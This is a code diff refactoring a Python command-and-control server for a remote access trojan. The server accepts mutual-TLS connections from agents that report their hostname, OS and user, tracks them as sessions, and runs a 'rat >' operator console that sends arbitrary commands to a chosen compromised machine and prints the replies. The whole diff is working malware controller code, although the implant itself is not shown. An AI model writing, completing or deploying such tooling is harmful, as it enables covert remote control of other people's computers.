@@ -1,6 +1,7 @@
 # écouter sur un port
 # accepter connexions
 # lancer threads
+
 import socket
 import ssl
 from threading import Thread
@@ -13,27 +14,70 @@ logger = setup_logger()
 
 
 class SSLServer:
+
     def __init__(
-        self, host, port, server_cert, server_key, client_cert, chunk_size=1024
+        self,
+        host,
+        port,
+        server_cert,
+        server_key,
+        client_cert,
+        chunk_size=4096,
     ):
+
         self.host = host
         self.port = port
         self.chunk_size = chunk_size
-        self._context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-        self._context.verify_mode = ssl.CERT_REQUIRED
-        self._context.load_cert_chain(server_cert, server_key)
-        self._context.load_verify_locations(client_cert)
+
         self.sessions = SessionManager()
 
-    def connect(self):
+        # SSL context
+        self._context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
 
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
+        self._context.verify_mode = ssl.CERT_REQUIRED
 
-            sock.bind((self.host, self.port))
-            sock.listen(5)
+        self._context.load_cert_chain(
+            server_cert,
+            server_key,
+        )
+
+        self._context.load_verify_locations(client_cert)
+
+    def start(self):
+
+        with socket.socket(
+            socket.AF_INET,
+            socket.SOCK_STREAM,
+        ) as sock:
+
+            sock.setsockopt(
+                socket.SOL_SOCKET,
+                socket.SO_REUSEADDR,
+                1,
+            )
+
+            sock.bind(
+                (
+                    self.host,
+                    self.port,
+                )
+            )
+
+            sock.listen(100)
+
+            logger.info(
+                "Server listening on %s:%s",
+                self.host,
+                self.port,
+            )
 
             print("Server listening")
-            logger.info("Server listening")
+
+            # lancer command loop dans thread séparé
+            Thread(
+                target=self.command_loop,
+                daemon=True,
+            ).start()
 
             while True:
 
@@ -46,25 +90,22 @@ class SSLServer:
                         server_side=True,
                     )
 
-                    print("Client connected:", addr[0])
-                    logger.info("Client connected: %s", addr[0])
+                    logger.info(
+                        "Client connected: %s",
+                        addr[0],
+                    )
 
                     data = sconn.recv(self.chunk_size)
 
                     if not data:
+
                         logger.warning("Client disconnected before sending info")
+
                         sconn.close()
+
                         continue
 
                     client_info = json.loads(data.decode())
-
-                    logger.info(
-                        "New agent: %s | %s | %s | %s",
-                        client_info["hostname"],
-                        client_info["os"],
-                        client_info["user"],
-                        client_info["release"],
-                    )
 
                     session_id = self.sessions.add(
                         sconn,
@@ -77,11 +118,15 @@ class SSLServer:
                         client_info["hostname"],
                     )
 
+                    print(
+                        f"[+] Session {session_id} opened "
+                        f"({client_info['hostname']})"
+                    )
+
                     Thread(
-                        target=self._handle_client,
+                        target=self._client_receiver,
                         args=(
                             sconn,
-                            client_info,
                             session_id,
                         ),
                         daemon=True,
@@ -89,10 +134,13 @@ class SSLServer:
 
                 except ssl.SSLError:
 
-                    print("SSL handshake failed")
                     logger.error("SSL handshake failed")
 
-    def _recv(self, sock):
+    def _client_receiver(
+        self,
+        sock,
+        session_id,
+    ):
 
         try:
 
@@ -101,129 +149,151 @@ class SSLServer:
                 data = sock.recv(self.chunk_size)
 
                 if not data:
-                    print("Client disconnected")
-                    logger.warning("Client disconnected")
+
+                    logger.warning(
+                        "Client %s disconnected",
+                        session_id,
+                    )
+
+                    print(f"\n[-] Session " f"{session_id} disconnected")
+
                     break
 
-                print(data.decode())
+                response = data.decode(errors="ignore")
 
-        except ConnectionResetError:
+                print(f"\n[{session_id}] " f"{response}")
 
-            print("Client forcibly closed connection")
-            logger.warning("Client forcibly closed connection")
+                print(
+                    "rat > ",
+                    end="",
+                    flush=True,
+                )
 
-        except ssl.SSLError:
+        except (
+            ConnectionResetError,
+            BrokenPipeError,
+        ):
 
-            print("SSL error")
-            logger.error("SSL error")
-        except Exception as e:
-
-            print(f"Error: {e}")
+            logger.warning(
+                "Connection lost: %s",
+                session_id,
+            )
 
         finally:
 
+            self.sessions.remove(session_id)
+
             sock.close()
 
-    def _handle_client(self, sock, client_info, session_id):
+    def command_loop(self):
 
-        logger.info(
-            "Handler started for %s (%s)",
-            client_info["hostname"],
-            client_info["os"],
-        )
+        while True:
 
-        sock.settimeout(1)
+            try:
 
-        try:
+                command = input("rat > ").strip()
 
-            while True:
+                if not command:
 
-                try:
+                    continue
 
-                    command = input("rat > ").strip()
+                if command == "exit":
 
-                    if not command:
-                        continue
+                    print("Bye")
 
-                    if command == "exit":
-                        os._exit(0)
+                    os._exit(0)
 
-                    if command == "sessions":
-                        self.sessions.list_sessions()
-                        continue
+                # lister les sessions
 
-                    if command.startswith("interact"):
+                if command == "sessions":
 
-                        try:
-                            session_id = int(command.split()[1])
-                            self.sessions.interact(session_id)
-                        except (IndexError, ValueError):
-                            print("Usage: interact <id>")
+                    self.sessions.list_sessions()
+
+                    continue
+
+                # interact
+
+                if command.startswith("interact"):
+
+                    try:
+
+                        sid = int(command.split()[1])
+
+                        if sid not in self.sessions.sessions:
+
+                            print("Session not found")
+
                             continue
 
-                    if self.sessions.current_session is None:
-                        print("No session selected")
-                        continue
+                        self.sessions.current_session = sid
 
-                    session = self.sessions.sessions[self.sessions.current_session]
+                        print(f"Now interacting with {sid}")
 
-                    sock = session["socket"]
+                    except (
+                        IndexError,
+                        ValueError,
+                    ):
+
+                        print("Usage: interact <id>")
+
+                    continue
+
+                # vérifier session active
+
+                if self.sessions.current_session is None:
+
+                    print("No session selected")
+
+                    continue
+
+                session = self.sessions.sessions.get(self.sessions.current_session)
+
+                if not session:
+
+                    print("Session not found")
+
+                    continue
+
+                sock = session["socket"]
+
+                try:
 
                     sock.sendall(command.encode())
 
                     logger.info(
                         "Command sent to %s: %s",
-                        client_info["hostname"],
+                        self.sessions.current_session,
                         command,
                     )
 
-                    data = sock.recv(self.chunk_size)
+                except Exception:
 
-                    if not data:
-                        logger.warning(
-                            "Client disconnected: %s",
-                            client_info["hostname"],
-                        )
+                    print("Failed to send command")
 
-                        self.sessions.remove(session_id)
+                    self.sessions.remove(self.sessions.current_session)
 
-                        break
+                    self.sessions.current_session = None
 
-                    response = data.decode(errors="ignore")
+            except KeyboardInterrupt:
 
-                    print(response)
+                print()
 
-                except socket.timeout:
-
-                    continue
-
-                except (
-                    ConnectionResetError,
-                    BrokenPipeError,
-                ):
-
-                    logger.warning(
-                        "Client connection lost: %s",
-                        client_info["hostname"],
-                    )
-                    self.sessions.remove(session_id)
-                    break
-
-        finally:
-
-            sock.close()
-
-            logger.info(
-                "Socket closed for %s",
-                client_info["hostname"],
-            )
+                continue
 
 
 class SSLServerThread(Thread):
-    def __init__(self, server):
+
+    def __init__(
+        self,
+        server,
+    ):
+
         super().__init__()
+
         self._server = server
+
         self.daemon = True
 
     def run(self):
-        self._server.connect()
+
+        self._server.start()
